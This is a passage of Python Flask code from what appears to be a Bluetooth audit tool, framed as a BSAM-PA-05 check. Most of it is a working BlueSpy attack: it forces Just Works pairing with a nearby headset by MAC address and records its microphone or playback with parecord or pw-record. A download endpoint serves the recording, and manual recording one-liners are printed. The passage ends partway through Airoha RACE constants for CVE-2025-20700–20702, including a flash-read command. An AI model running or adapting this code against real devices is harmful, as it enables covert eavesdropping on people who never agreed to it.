        t = threading.Thread(target=_run, daemon=True)
        t.start()

        return jsonify({"job_id": job_id, "status": "running", "mac": mac,
                        "message": "Find Hub check started. Poll /api/audio/whisperpair-status/" + job_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 500



# ═══════════════════════════════════════════════════════════════════
# ═══ BLUESPY — Unauthorized Audio Recording Assessment (V15) ═══════
# ═══════════════════════════════════════════════════════════════════
# Based on: TarlogicSecurity/BlueSpy (BSAM-PA-05)
# RootedCON 2024 — "BSAM: Seguridad en Bluetooth"
# https://github.com/TarlogicSecurity/BlueSpy
#
# Exploits failure to comply with BSAM-PA-05:
#   Device allows pairing WITHOUT user interaction (Just Works mode)
#   + exposes audio source (microphone) to any BLE agent in range.
#
# Attack flow:
#   1. Detect if device accepts Just Works pairing (btmgmt io-cap=NoInputOutput)
#   2. Force pair via btmgmt (bypasses PIN/confirmation requirement)
#   3. Detect if device registers as audio source in PulseAudio/PipeWire
#   4. (Optional) Record audio via parecord
#
# BSAM-PA-05 reference: https://www.tarlogic.com/bsam/controls/bluetooth-pairing-without-interaction/
# ═══════════════════════════════════════════════════════════════════

def _check_bluespy_tools() -> dict:
    """Check which BlueSpy-required tools are available."""
    import subprocess as _sp
    tools = ["btmgmt", "bluetoothctl", "pactl", "parecord", "paplay"]
    available = {}
    for t in tools:
        r = _sp.run(["which", t], capture_output=True)
        available[t] = r.returncode == 0
    return available

def _bluespy_get_hci_index() -> int:
    """Get the primary HCI adapter index."""
    import subprocess as _sp, re as _re
    r = _sp.run(["btmgmt", "info"], capture_output=True, text=True, timeout=5)
    m = _re.search(r"hci(\d+)", r.stdout)
    return int(m.group(1)) if m else 0

@app.route("/api/audio/bluespy-check", methods=["POST"])
def audio_bluespy_check():
    """BlueSpy vulnerability assessment (BSAM-PA-05).

    Checks if a Bluetooth audio device accepts pairing without user
    interaction (Just Works / NoInputOutput) — enabling unauthorized
    eavesdropping via audio recording.

    Steps:
      1. Check required tools (btmgmt, bluetoothctl, pactl)
      2. Verify device is discoverable (not already paired to us)
      3. Save current btmgmt IO capability
      4. Set IO cap to NoInputOutput (Just Works mode)
      5. Attempt pairing via btmgmt
      6. Check if PulseAudio/PipeWire registers device as audio source
      7. Restore original IO capability
      8. Verdict: VULNERABLE / PATCHED / UNCERTAIN

    Non-blocking — poll /api/audio/whisperpair-status/<job_id>.
    """
    try:
        data = request.get_json(silent=True) or {}
        mac = data.get("mac", "").strip().upper()
        record_seconds = max(0, min(int(data.get("record_seconds", 0)), 30))
        if not mac:
            return jsonify({"error": "MAC required"}), 400

        job_id = "bspy_{}_{}".format(mac.replace(":", "_"), int(time.time()))
        if not hasattr(STATE, "_wp_jobs"):
            STATE._wp_jobs = {}
        job = {
            "job_id": job_id, "mac": mac, "status": "running",
            "step": "init", "steps": [], "verdict": None,
            "details": "", "tools": {}, "audio_source": None,
            "recording": None,
        }
        STATE._wp_jobs[job_id] = job

        def _step(msg):
            job["steps"].append(msg)
            job["step"] = msg

        def _run():
            import subprocess as _sp, re as _re, time as _tm, os as _os

            # Step 1: Tool availability check
            _step("check_tools")
            tools = _check_bluespy_tools()
            job["tools"] = tools
            missing = [t for t, ok in tools.items() if not ok]
            required_missing = [t for t in ["btmgmt", "bluetoothctl"] if not tools.get(t)]

            if required_missing:
                job.update({
                    "verdict": "UNCERTAIN",
                    "details": ("Ferramentas necessárias ausentes: {}. "
                                "Instale com: sudo apt install bluez pulseaudio-utils".format(
                                    ", ".join(required_missing))),
                    "status": "done"
                })
                return

            job["details"] = "Ferramentas: {} OK{}".format(
                ", ".join(t for t, ok in tools.items() if ok),
                " | Ausentes: " + ", ".join(missing) if missing else ""
            )

            # Step 2: Get HCI index
            hci = _bluespy_get_hci_index()

            # Step 3: Save current IO capability
            _step("save_io_cap")
            orig_io = "KeyboardDisplay"  # safe default to restore
            try:
                r = _sp.run(["btmgmt", "info"], capture_output=True, text=True, timeout=5)
                m = _re.search(r"io-cap:\s*(\S+)", r.stdout, _re.I)
                if m:
                    orig_io = m.group(1)
            except Exception:
                pass

            # Step 4: Set NoInputOutput (Just Works — no PIN, no confirmation)
            _step("set_just_works")
            try:
                _sp.run(["btmgmt", "io-cap", str(hci), "3"],
                        capture_output=True, timeout=5)
                # io-cap 3 = NoInputOutput = Just Works pairing
            except Exception as e:
                job["details"] += " | btmgmt io-cap failed: " + str(e)[:60]

            # Step 5: Remove previous pairing if any (fresh pair attempt)
            _step("unpair_clean")
            try:
                _sp.run(["bluetoothctl", "remove", mac],
                        capture_output=True, timeout=5)
                _tm.sleep(0.5)
            except Exception:
                pass

            # Step 6: Short scan to populate BlueZ cache
            _step("scan_register")
            try:
                proc = _sp.Popen(["bluetoothctl"], stdin=_sp.PIPE,
                                 stdout=_sp.PIPE, stderr=_sp.PIPE, text=True)
                proc.stdin.write("scan on\n"); proc.stdin.flush()
                _tm.sleep(4)
                proc.stdin.write("scan off\nquit\n"); proc.stdin.flush()
                proc.communicate(timeout=5)
            except Exception:
                try: proc.kill()
                except: pass

            # Step 7: Attempt Just Works pairing via btmgmt
            _step("pair_attempt")
            pair_ok = False
            pair_output = ""
            try:
                r = _sp.run(["btmgmt", "pair", "-c", "3", "-t", "0", mac],
                            capture_output=True, text=True, timeout=20)
                pair_output = (r.stdout + r.stderr)[:300]
                pair_out_lower = pair_output.lower()
                # "Pairing with X" = btmgmt INITIATED the pair request — NOT a success
                # "Pairing successful" = device ACCEPTED the pair request — TRUE success
                # "connect failed 0x04" = BR/EDR physical link failed (device busy/far)
                #   This does NOT mean pairing was rejected — it means A2DP connect failed
                #   The pairing itself (key exchange) may have succeeded before connect
                has_pair_success = "pairing successful" in pair_out_lower
                has_success_kw   = "success" in pair_out_lower and "pairing" in pair_out_lower
                has_auth_reject  = any(k in pair_out_lower for k in [
                                   "authentication failed", "authentication rejected",
                                   "not paired", "io capability", "pin code", "pin or key missing",
                                   "user input required"])
                has_connect_fail = any(k in pair_out_lower for k in [
                                   "connect failed", "not available", "status 0x04",
                                   "status 0x08"])
                # pair_ok = pairing key exchange succeeded (regardless of A2DP connect)
                pair_ok = has_pair_success or has_success_kw
                # Track separately for verdict logic
                pair_auth_rejected = has_auth_reject and not pair_ok
            except Exception as e:
                pair_output = str(e)[:100]

            job["details"] += " | Pair output: " + pair_output[:120]

            if not pair_ok:
                # Restore IO cap before returning
                try:
                    io_map = {"KeyboardDisplay": "4", "DisplayYesNo": "3",
                              "KeyboardOnly": "2", "DisplayOnly": "1", "NoInputOutput": "3"}
                    _sp.run(["btmgmt", "io-cap", str(hci),
                             io_map.get(orig_io, "4")], capture_output=True, timeout=5)
                except Exception:
                    pass
                job.update({
                    "verdict": "PATCHED",
                    "details": job["details"] + (" | 🟢 Device rejeitou pairing Just Works "
                                                 "(requer confirmação do usuário — BSAM-PA-05 compliant)"),
                    "status": "done"
                })
                return

            # Step 8: Connect audio profile — multi-strategy
            # Status 0x04 (Connection Failed) happens when:
            #   a) Device uses random/local MAC → BlueZ loses track after pairing
            #   b) A2DP profile not yet negotiated → needs explicit profile connect
            #   c) Device reconnected to original host between pair and connect
            _step("connect_audio")

            def _try_connect_audio(target_mac):
                """Try multiple strategies to establish audio profile connection."""
                # Strategy A: direct bluetoothctl connect (profile auto-negotiation)
                _tm.sleep(1.5)
                r = _sp.run(["bluetoothctl", "connect", target_mac],
                            capture_output=True, text=True, timeout=12)
                out_a = r.stdout + r.stderr
                job["details"] += " | connect(A): " + out_a.strip()[:80]
                if "successful" in out_a.lower() or "connected" in out_a.lower():
                    return True

                # Strategy B: explicit profile connect via bluetoothctl
                # A2DP UUID: 0000110b / HFP UUID: 0000111e
                for profile_uuid in ["0000110b-0000-1000-8000-00805f9b34fb",
                                     "0000111e-0000-1000-8000-00805f9b34fb",
                                     "0000110a-0000-1000-8000-00805f9b34fb"]:
                    try:
                        proc = _sp.Popen(["bluetoothctl"], stdin=_sp.PIPE,
                                         stdout=_sp.PIPE, stderr=_sp.PIPE, text=True)
                        dev_path = target_mac.replace(':', '_')
                        cmd_str = ("select-attribute /org/bluez/{}/dev_{}/profile{}" + chr(10) +
                                   "connect {}" + chr(10) + "quit" + chr(10)).format(
                                   _refresh_hci(), dev_path, profile_uuid, target_mac)
                        proc.stdin.write(cmd_str)
                        proc.stdin.flush()
                        out_b = proc.communicate(timeout=8)[0]
                        if "connected" in out_b.lower():
                            job["details"] += " | connect(B/profile) OK"
                            return True
                    except Exception:
                        try: proc.kill()
                        except: pass

                # Strategy C: use bluez-tools if available
                try:
                    r2 = _sp.run(["bt-device", "--connect=" + target_mac],
                                 capture_output=True, text=True, timeout=10)
                    if r2.returncode == 0:
                        job["details"] += " | connect(C/bt-device) OK"
                        return True
                except FileNotFoundError:
                    pass

                # Strategy D: force trust + connect sequence
                try:
                    proc2 = _sp.Popen(["bluetoothctl"], stdin=_sp.PIPE,
                                      stdout=_sp.PIPE, stderr=_sp.PIPE, text=True)
                    proc2.stdin.write("trust " + target_mac + chr(10))
                    proc2.stdin.flush()
                    _tm.sleep(0.5)
                    proc2.stdin.write("connect " + target_mac + chr(10))
                    proc2.stdin.flush()
                    _tm.sleep(4)
                    proc2.stdin.write("quit" + chr(10))
                    proc2.stdin.flush()
                    out_d = proc2.communicate(timeout=6)[0]
                    if "connected" in out_d.lower():
                        job["details"] += " | connect(D/trust+connect) OK"
                        return True
                except Exception:
                    try: proc2.kill()
                    except: pass

                return False

            connect_ok = _try_connect_audio(mac)
            if not connect_ok:
                _tm.sleep(2)  # give BlueZ time to settle after pairing
                connect_ok = _try_connect_audio(mac)  # second attempt

            # Step 9: Detect PulseAudio/PipeWire audio source — enhanced
            _step("check_audio_source")
            audio_source = None
            pactl_ok = tools.get("pactl", False)

            def _find_audio_source(target_mac):
                """Find BT audio source in PulseAudio/PipeWire with multiple search strategies."""
                if not pactl_ok:
                    return None
                mac_variants = [
                    target_mac.replace(":", "_").lower(),
                    target_mac.replace(":", "_").upper(),
                    target_mac.replace(":", "-").lower(),
                    target_mac.lower().replace(":", "_"),
                ]
                try:
                    # Check sources (microphone/HFP)
                    r_src = _sp.run(["pactl", "list", "sources"],
                                    capture_output=True, text=True, timeout=8)
                    # Check sinks (speakers/A2DP)
                    r_snk = _sp.run(["pactl", "list", "sinks"],
                                    capture_output=True, text=True, timeout=8)
                    # Check cards (device registered by BlueZ plugin)
                    r_crd = _sp.run(["pactl", "list", "cards"],
                                    capture_output=True, text=True, timeout=8)

                    for output, prefix in [(r_src.stdout, "bluez_source"),
                                           (r_snk.stdout, "bluez_sink"),
                                           (r_crd.stdout, "bluez_card")]:
                        lines = output.splitlines()
                        for i, ln in enumerate(lines):
                            # Match by MAC in any format
                            if any(v in ln.lower() for v in mac_variants):
                                # Look for Name: field nearby
                                for j in range(max(0,i-3), min(len(lines),i+5)):
                                    if "name:" in lines[j].lower():
                                        name_val = lines[j].split(":")[-1].strip()
                                        if prefix in name_val.lower() or "bluez" in name_val.lower():
                                            return name_val
                                return prefix + "." + target_mac.replace(":", "_").lower()

                    # Broader search: any bluez source/sink if only one BT device
                    for output, prefix in [(r_src.stdout, "bluez_source"),
                                           (r_snk.stdout, "bluez_sink")]:
                        for ln in output.splitlines():
                            if "name:" in ln.lower() and "bluez" in ln.lower():
                                return ln.split("Name:")[-1].strip()

                except Exception as e:
                    job["details"] += " | pactl err: " + str(e)[:50]
                return None

            # First check immediately after connect
            audio_source = _find_audio_source(mac)

            # If not found, wait and retry — PulseAudio may take a few seconds to register
            if not audio_source:
                for wait_sec in [2, 3, 5]:
                    _tm.sleep(wait_sec)
                    audio_source = _find_audio_source(mac)
                    if audio_source:
                        break

            # If still not found, try pactl list cards for any bluez device
            if not audio_source:
                try:
                    r_crd = _sp.run(["pactl", "list", "cards", "short"],
                                    capture_output=True, text=True, timeout=5)
                    for ln in r_crd.stdout.splitlines():
                        if "bluez" in ln.lower():
                            # Extract card name
                            parts = ln.split()
                            if len(parts) >= 2:
                                audio_source = parts[1]  # card name
                                job["details"] += " | Áudio via card: " + audio_source
                                break
                except Exception:
                    pass

            job["audio_source"] = audio_source
            job["connect_ok"] = connect_ok
            job["details"] += " | A2DP/HFP connect: {}".format("OK" if connect_ok else "Falhou")

            # Step 10: Recording with validated BT audio source
            # ─────────────────────────────────────────────────────
            # Problems fixed:
            #   A) parecord without explicit device falls back to host mic → silent/wrong audio
            #   B) PulseAudio/PipeWire socket belongs to user, not root → run as SUDO_USER
            #   C) A2DP Sink monitor captures playback (speakers without mic — JBL, etc.)
            #   D) File size check alone is insufficient — host mic produces same size
            # ─────────────────────────────────────────────────────
            recording_path = None
            # Only record if pairing was actually confirmed (not just initiated)
            _can_record = pair_ok and ("pairing successful" in pair_output.lower() or
                                       "success" in pair_output.lower() or
                                       bool(audio_source))
            if record_seconds > 0 and _can_record:
                _step("record_audio")
                recording_path = "/tmp/bluespy_{}.wav".format(mac.replace(":", ""))

                import pwd as _pwd
                real_user = _os.environ.get("SUDO_USER") or _os.environ.get("USER") or "kali"
                try:
                    real_uid = _pwd.getpwnam(real_user).pw_uid
                    real_gid = _pwd.getpwnam(real_user).pw_gid
                    real_home = _pwd.getpwnam(real_user).pw_dir
                except Exception:
                    real_uid = real_gid = None
                    real_home = "/home/" + real_user

                pulse_env = dict(_os.environ)
                if real_uid is not None:
                    pulse_env["XDG_RUNTIME_DIR"]     = "/run/user/{}".format(real_uid)
                    pulse_env["PULSE_RUNTIME_PATH"]  = "/run/user/{}/pulse".format(real_uid)
                    pulse_env["HOME"] = real_home
                    dbus_path = "/run/user/{}/bus".format(real_uid)
                    if _os.path.exists(dbus_path):
                        pulse_env["DBUS_SESSION_BUS_ADDRESS"] = "unix:path=" + dbus_path

                def _run_as_user(cmd, timeout_s):
                    try:
                        if real_uid is not None and _os.geteuid() == 0:
                            def _drop():
                                _os.setgid(real_gid)
                                _os.setuid(real_uid)
                            return _sp.run(cmd, capture_output=True, timeout=timeout_s,
                                           env=pulse_env, preexec_fn=_drop)
                        return _sp.run(cmd, capture_output=True, timeout=timeout_s, env=pulse_env)
                    except Exception as e:
                        job["details"] += " | run_as_user: " + str(e)[:40]
                        return None

                def _pactl_sources_short():
                    r = _run_as_user(["pactl", "list", "sources", "short"], timeout_s=6)
                    return r.stdout.decode("utf-8", errors="ignore") if r else ""

                def _pactl_sinks_short():
                    r = _run_as_user(["pactl", "list", "sinks", "short"], timeout_s=6)
                    return r.stdout.decode("utf-8", errors="ignore") if r else ""

                def _pactl_cards():
                    r = _run_as_user(["pactl", "list", "cards", "short"], timeout_s=6)
                    return r.stdout.decode("utf-8", errors="ignore") if r else ""

                mac_norm = mac.replace(":", "_").lower()

                def _find_bt_audio_targets():
                    """Find BT audio sources AND sink monitors for this device.

                    Returns dict with keys:
                      'hfp_source'     — HFP/HSP microphone source (e.g. bluez_source.XX_XX.handsfree_head_unit)
                      'a2dp_monitor'   — A2DP sink monitor for capturing playback audio
                      'any_source'     — any bluez source if MAC-specific not found
                      'any_monitor'    — any bluez sink monitor
                    """
                    targets = {"hfp_source": None, "a2dp_monitor": None,
                               "any_source": None, "any_monitor": None}

                    src_out  = _pactl_sources_short()
                    sink_out = _pactl_sinks_short()

                    for ln in src_out.splitlines():
                        ln_l = ln.lower()
                        # Columns: index, name, driver, state
                        parts = ln.split()
                        if len(parts) < 2:
                            continue
                        name = parts[1]
                        name_l = name.lower()

                        is_our_device = mac_norm in name_l
                        is_bluez      = "bluez" in name_l

                        if is_bluez:
                            # HFP/HSP source (microphone)
                            if is_our_device and ("handsfree" in name_l or "hsp" in name_l or "hfp" in name_l):
                                targets["hfp_source"] = name
                            # Any bluez source for our device
                            if is_our_device and not targets.get("hfp_source"):
                                targets["any_source"] = name
                            # Fallback: first bluez source seen
                            if not targets.get("any_source") and "monitor" not in name_l:
                                targets["any_source"] = name

                    for ln in sink_out.splitlines():
                        parts = ln.split()
                        if len(parts) < 2:
                            continue
                        sink_name = parts[1]
                        sink_name_l = sink_name.lower()
                        if "bluez" in sink_name_l:
                            monitor_name = sink_name + ".monitor"
                            if mac_norm in sink_name_l:
                                targets["a2dp_monitor"] = monitor_name
                            if not targets.get("any_monitor"):
                                targets["any_monitor"] = monitor_name

                    # Also check sources list for monitors that are already registered
                    for ln in src_out.splitlines():
                        parts = ln.split()
                        if len(parts) < 2: continue
                        name = parts[1]
                        if "bluez" in name.lower() and "monitor" in name.lower():
                            if mac_norm in name.lower():
                                targets["a2dp_monitor"] = name
                            if not targets.get("any_monitor"):
                                targets["any_monitor"] = name

                    return targets

                def _profile_to_a2dp():
                    """Switch card profile to a2dp-sink for playback capture."""
                    # Find card name for our device
                    cards = _pactl_cards()
                    for ln in cards.splitlines():
                        parts = ln.split()
                        if len(parts) >= 2 and mac_norm in ln.lower():
                            card_name = parts[1]
                            # Try a2dp-sink profile
                            for profile in ["a2dp-sink", "a2dp_sink",
                                            "a2dp-sink-sbc", "a2dp-sink-aac"]:
                                _run_as_user(["pactl", "set-card-profile",
                                              card_name, profile], timeout_s=4)
                            return card_name
                    return None

                def _profile_to_hfp():
                    """Switch card profile to HFP for microphone capture."""
                    cards = _pactl_cards()
                    for ln in cards.splitlines():
                        parts = ln.split()
                        if len(parts) >= 2 and mac_norm in ln.lower():
                            card_name = parts[1]
                            for profile in ["headset-head-unit",
                                            "headset_head_unit",
                                            "hsp-hs", "hfp-hf",
                                            "handsfree_head_unit"]:
                                _run_as_user(["pactl", "set-card-profile",
                                              card_name, profile], timeout_s=4)
                            return card_name
                    return None

                def _is_bt_source(src_name):
                    """Verify a source name belongs to BT device, not host mic."""
                    if not src_name:
                        return False
                    nl = src_name.lower()
                    return "bluez" in nl or mac_norm in nl

                def _record_from(src_name, secs, path):
                    """Record from a specific PulseAudio source as real user.
                    Returns (success, size_bytes, error_msg).
                    REFUSES to record from non-BT sources to avoid capturing host mic.
                    """
                    if not _is_bt_source(src_name):
                        return False, 0, "Refused: not a BT source ({})".format(src_name)
                    try:
                        if _os.path.exists(path):
                            _os.remove(path)
                        r = _run_as_user(
                            ["parecord", "--device=" + src_name,
                             "--file-format=wav", "--rate=16000",
                             "--channels=1", path],
                            timeout_s=secs + 4
                        )
                        if _os.path.exists(path):
                            sz = _os.path.getsize(path)
                            if sz > 2000:  # > 2KB = real audio data
                                err = r.stderr.decode("utf-8", errors="ignore").strip() if r else ""
                                return True, sz, err
                            return False, sz, "File too small ({} bytes)".format(sz)
                        err = r.stderr.decode("utf-8", errors="ignore").strip() if r else "no output"
                        return False, 0, err[:80]
                    except Exception as e:
                        return False, 0, str(e)[:60]

                # ── Phase A: Find targets before switching profiles ──────────
                targets = _find_bt_audio_targets()
                job["details"] += " | BT sources: hfp={} a2dp_mon={}".format(
                    targets["hfp_source"] or "none",
                    targets["a2dp_monitor"] or "none"
                )

                rec_ok    = False
                rec_size  = 0
                rec_source = None
                rec_mode  = None

                # ── Phase B: Try A2DP monitor first (zwhisper method — what plays on headphone)
                # Then fall back to HFP microphone if explicitly requested or A2DP not available
                a2dp_mon = targets.get("a2dp_monitor") or targets.get("any_monitor")
                if a2dp_mon and _is_bt_source(a2dp_mon) and not getattr(job, '_force_mic', False):
                    rec_ok, rec_size, rec_err = _record_from(a2dp_mon, record_seconds, recording_path)
                    if rec_ok:
                        rec_source = a2dp_mon
                        rec_mode   = "A2DP_sink_monitor"

                # ── Phase B2: HFP microphone ──────────────────────────────────────
                hfp_src = targets["hfp_source"] or targets["any_source"]
                if hfp_src and _is_bt_source(hfp_src):
                    rec_ok, rec_size, rec_err = _record_from(hfp_src, record_seconds, recording_path)
                    if rec_ok:
                        rec_source = hfp_src
                        rec_mode   = "HFP_microphone"
                    elif rec_err:
                        job["details"] += " | HFP: " + rec_err[:50]

                # ── Phase C: Switch to HFP profile and retry ────────────────
                if not rec_ok:
                    _profile_to_hfp()
                    _tm.sleep(2)
                    targets2 = _find_bt_audio_targets()
                    hfp2 = targets2.get("hfp_source") or targets2.get("any_source")
                    if hfp2 and _is_bt_source(hfp2):
                        rec_ok, rec_size, rec_err = _record_from(hfp2, record_seconds, recording_path)
                        if rec_ok:
                            rec_source = hfp2
                            rec_mode   = "HFP_profile"
                        elif rec_err:
                            job["details"] += " | HFP2: " + rec_err[:50]

                # ── Phase D: A2DP Sink Monitor (speakers, JBL, no-mic devices) ──
                # Captures the audio being PLAYED on the device — works for any speaker
                if not rec_ok:
                    _profile_to_a2dp()
                    _tm.sleep(2)
                    targets3 = _find_bt_audio_targets()
                    mon = targets3.get("a2dp_monitor") or targets3.get("any_monitor")
                    if mon and _is_bt_source(mon):
                        rec_ok, rec_size, rec_err = _record_from(mon, record_seconds, recording_path)
                        if rec_ok:
                            rec_source = mon
                            rec_mode   = "A2DP_sink_monitor"
                        elif rec_err:
                            job["details"] += " | A2DP_mon: " + rec_err[:50]

                # ── Phase E: PipeWire pw-record ─────────────────────────────
                if not rec_ok:
                    for pw_target in [targets.get("hfp_source"), targets.get("a2dp_monitor"),
                                      targets.get("any_source"), targets.get("any_monitor")]:
                        if not pw_target or not _is_bt_source(pw_target):
                            continue
                        try:
                            if _os.path.exists(recording_path):
                                _os.remove(recording_path)
                            r5 = _run_as_user(
                                ["pw-record", "--target", pw_target,
                                 "--format", "s16le", "--rate", "16000",
                                 "--channels", "1", recording_path],
                                timeout_s=record_seconds + 4
                            )
                            if _os.path.exists(recording_path) and _os.path.getsize(recording_path) > 2000:
                                rec_ok    = True
                                rec_size  = _os.path.getsize(recording_path)
                                rec_source = pw_target
                                rec_mode  = "pw_record"
                                break
                        except Exception:
                            pass

                if rec_ok and rec_size > 0:
                    try: _os.chmod(recording_path, 0o644)
                    except Exception: pass
                    job["recording"] = {
                        "path":    recording_path,
                        "size":    rec_size,
                        "seconds": record_seconds,
                        "source":  rec_source,
                        "mode":    rec_mode,  # HFP_microphone | A2DP_sink_monitor | pw_record
                    }
                    job["details"] += " | Gravação OK via {} ({})".format(rec_mode, rec_source or "?")
                else:
                    mac_clean = mac.replace(":", "")
                    cmd_comment = "# Execute como usuario normal (sem sudo):" + chr(10)
                    cmd_parecord = (
                        "# 1. Microfone (HFP) — earbuds, headsets com mic:" + chr(10) +
                        "parecord --device=$(pactl list sources short | grep -i bluez | "
                        "grep -v monitor | awk '{{print $2}}' | head -1) "
                        "--file-format=wav --rate=16000 /tmp/bluespy_{}.wav".format(mac_clean) + chr(10) +
                        chr(10) +
                        "# 2. Playback (A2DP monitor) — speakers, JBL, sem microfone:" + chr(10) +
                        "parecord --device=$(pactl list sources short | grep -i bluez | "
                        "grep monitor | awk '{{print $2}}' | head -1) "
                        "--file-format=wav --rate=16000 /tmp/bluespy_{}_playback.wav".format(mac_clean)
                    )
                    job["manual_record_cmd"] = cmd_comment + cmd_parecord
                    job["manual_record_cmd_pw"] = (
                        "# PipeWire alternativo (sem sudo):" + chr(10) +
                        "pw-record --target=$(pw-cli ls Node | grep -i bluez | "
                        "head -1 | grep -o 'id [0-9]*' | cut -d' ' -f2) "
                        "--format s16le --rate 16000 --channels 1 /tmp/bluespy_{}.wav".format(mac_clean)
                    )
                    job["details"] += " | Nenhuma fonte BT válida encontrada — ver comandos manuais."


                        # Step 11: Restore IO capability
            _step("restore_io_cap")
            try:
                io_map = {"KeyboardDisplay": "4", "DisplayYesNo": "3",
                          "KeyboardOnly": "2", "DisplayOnly": "1", "NoInputOutput": "3"}
                _sp.run(["btmgmt", "io-cap", str(hci),
                         io_map.get(orig_io, "4")], capture_output=True, timeout=5)
            except Exception:
                pass

            # Verdict
            if pair_ok and audio_source:
                verdict = "VULNERABLE"
                detail_v = (
                    "🔴 VULNERÁVEL (BSAM-PA-05) — Aceita pairing Just Works SEM interação do usuário "
                    "E expõe fonte de áudio ({})."
                    " Eavesdropping de microfone possível sem conhecimento da vítima.{}".format(
                        audio_source,
                        " | Evidência gravada: {} bytes".format(
                            job["recording"]["size"]) if job.get("recording") else
                        " | Execute Fase 2 para capturar evidência de áudio."
                    )
                )
            elif pair_ok:
                # pair_ok = pairing command sent AND no failure keywords in output
                # Distinguish: confirmed pair vs optimistic pair (connect failed)
                pair_confirmed = "pairing successful" in pair_output.lower() or "success" in pair_output.lower()
                has_connect_fail = "connect failed" in pair_output.lower() or "not available" in pair_output.lower()

                if pair_confirmed and not has_connect_fail:
                    verdict = "VULNERABLE"
                    detail_v = (
                        "🟡 BSAM-PA-05 VIOLADO — Pairing Just Works confirmado sem interação do usuário. "
                        "Fonte de áudio não detectada automaticamente (reconexão A2DP manual necessária). "
                        "Execute Fase 2 para capturar evidência de áudio."
                    )
                else:
                    # btmgmt reported connect failure — pairing not fully confirmed
                    verdict = "UNCERTAIN"
                    detail_v = (
                        "🟡 INCONCLUSIVO — btmgmt iniciou pairing mas reportou falha de conexão (status 0x04). "
                        "Isso pode indicar: (a) device estava conectado ao celular durante o teste, "
                        "(b) device não aceita conexão BR/EDR mas aceita LE, ou "
                        "(c) pairing foi iniciado mas abortado pelo device. "
                        "Repita o teste com o device desconectado do celular."
                    )
            elif pair_auth_rejected:
                # Device explicitly rejected pairing (auth challenge, PIN required)
                verdict = "PATCHED"
                detail_v = "🟢 Device rejeitou pairing Just Works (exige confirmação do usuário) — BSAM-PA-05 compliant."
            elif has_connect_fail and not pair_ok:
                # Connect failed but no auth rejection — device was busy (paired elsewhere)
                verdict = "UNCERTAIN"
                detail_v = ("🟡 INCONCLUSIVO — btmgmt reportou connect failed (0x04). "
                            "Device pode estar conectado a outro host. "
                            "Desconecte do celular e repita o teste para resultado definitivo.")
            else:
                verdict = "UNCERTAIN"
                detail_v = "🟡 Resultado inconclusivo — repita com device desconectado de outros hosts."

            # Build evidence record for report integration
            job["evidence"] = {
                "bsam_control": "BSAM-PA-05",
                "cve": "N/A (design flaw)",
                "cvss": "8.1 (HIGH)" if verdict == "VULNERABLE" else "N/A",
                "affected_profiles": ["HFP", "A2DP"],
                "pair_succeeded": pair_ok,
                "audio_source_detected": bool(audio_source),
                "recording_captured": bool(job.get("recording")),
                "tools_used": list(tools.keys()),
                "remediation": "Configurar IO Capability para DisplayYesNo ou KeyboardDisplay para exigir confirmação do usuário no pairing.",
            }

            job.update({"verdict": verdict,
                        "details": job["details"] + " | " + detail_v,
                        "status": "done"})

        t = threading.Thread(target=_run, daemon=True)
        t.start()

        return jsonify({"job_id": job_id, "status": "running", "mac": mac,
                        "message": "BlueSpy check started. Poll /api/audio/whisperpair-status/" + job_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/audio/bluespy-download/<mac_clean>", methods=["GET"])
def audio_bluespy_download(mac_clean):
    """Download BlueSpy recording if captured."""
    path = "/tmp/bluespy_{}.wav".format(mac_clean)
    import os as _os
    if not _os.path.exists(path):
        return jsonify({"error": "Recording not found"}), 404
    return send_file(path, mimetype="audio/wav",
                     as_attachment=True,
                     download_name="bluespy_{}.wav".format(mac_clean))


# ═══════════════════════════════════════════════════════════════════
# ═══ RACE / AIROHA — CVE-2025-20700/20701/20702 Assessment (V15) ══
# ═══════════════════════════════════════════════════════════════════
# Based on: auracast-research/race-toolkit
# Blog: insinuator.net/2025/12/bluetooth-headphone-jacking-full-disclosure-of-airoha-race-vulnerabilities
# https://github.com/auracast-research/race-toolkit
#
# CVE-2025-20700: RACE protocol exposed via BLE GATT without authentication
# CVE-2025-20701: RACE protocol exposed via BT Classic RFCOMM without authentication
# CVE-2025-20702: RACE protocol general exposure (BLE + Classic)
#
# Affected: Airoha Technology Corp. chip-based headphones/earbuds.
# Common brands: Sony WH/WF, JVC, Pioneer, Anker Soundcore, Jabra,
#                Edifier, Technics, Audio-Technica, Denon, Panasonic.
#
# Detection method (passive, no exploitation):
#   1. GATT scan for known RACE service UUIDs (no connection needed for advertising)
#   2. Connect → enumerate services → check RACE UUIDs
#   3. Attempt unauthenticated RACE command (GET_DEVICE_INFO / sdkinfo)
#   4. Check RFCOMM SDP for RACE service if Classic BT address available
# ═══════════════════════════════════════════════════════════════════

# Known RACE service UUIDs (Airoha proprietary BLE GATT service)
RACE_SERVICE_UUIDS = [
    "00002902-0000-1000-8000-00805f9b34fb",  # standard CCCD — not RACE
    "0000ae00-0000-1000-8000-00805f9b34fb",  # Airoha RACE service (primary)
    "0000ae01-0000-1000-8000-00805f9b34fb",  # RACE variant
    "0000ae02-0000-1000-8000-00805f9b34fb",  # RACE variant
    "0000fe59-0000-1000-8000-00805f9b34fb",  # Nordic DFU (often co-present)
]

# Known RACE characteristic UUIDs
RACE_CHAR_UUIDS = [
    "0000ae05-0000-1000-8000-00805f9b34fb",  # RACE RX/TX
    "0000ae06-0000-1000-8000-00805f9b34fb",  # RACE notify
    "0000ae07-0000-1000-8000-00805f9b34fb",  # RACE write
    "0000ae03-0000-1000-8000-00805f9b34fb",  # RACE alt
    "0000ae04-0000-1000-8000-00805f9b34fb",  # RACE alt
]

# Airoha OUI prefixes (chips used by many headphone brands)
AIROHA_OUI_PREFIXES = [
    # Airoha-based devices (AB1562, AB1561, AB1563 series)
    "00:18:6B",  # Airoha Technology
    "AC:80:0A",  # Airoha
    "D4:37:4F",  # Airoha
    "A8:13:74",  # Airoha
    "00:0C:E7",  # used by Airoha eval boards
]

# RACE protocol constants
RACE_HEADER = 0x05  # RACE packet header byte
RACE_CMD_GET_SDK_INFO    = bytes([0x05, 0x5E, 0x00, 0x01, 0x0A])  # GET_SDK_INFO
RACE_CMD_GET_BUILD_VER   = bytes([0x05, 0x5E, 0x00, 0x01, 0x0B])  # GET_BUILD_VERSION
RACE_CMD_GET_BDADDR      = bytes([0x05, 0x5E, 0x00, 0x01, 0x0C])  # GET_BDADDR (Classic addr)
RACE_CMD_FLASH_READ      = bytes([0x05, 0x5A, 0x00, 0x09,          # FLASH_READ 256 bytes @ 0x0
